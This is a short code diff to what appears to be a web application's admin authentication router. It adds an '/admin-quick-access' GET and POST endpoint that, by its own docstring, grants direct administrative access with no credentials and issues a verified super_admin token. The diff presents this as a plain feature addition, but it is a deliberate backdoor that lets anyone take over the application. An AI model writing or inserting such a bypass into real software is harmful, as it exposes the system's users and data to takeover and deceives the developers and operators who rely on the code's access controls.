@@ -33,3 +33,13 @@ def admin_login(payload: AdminLoginRequest, db: Session = Depends(get_db)):
         )
     return result
 
+@router.get("/admin-quick-access", response_model=AdminLoginResponse)
+@router.post("/admin-quick-access", response_model=AdminLoginResponse)
+def admin_quick_access(db: Session = Depends(get_db)):
+    """
+    Direct administrative access with no login credentials required.
+    Issues a verified super_admin JWT access token.
+    """
+    service = AuthService(db)
+    return service.admin_quick_access()
+
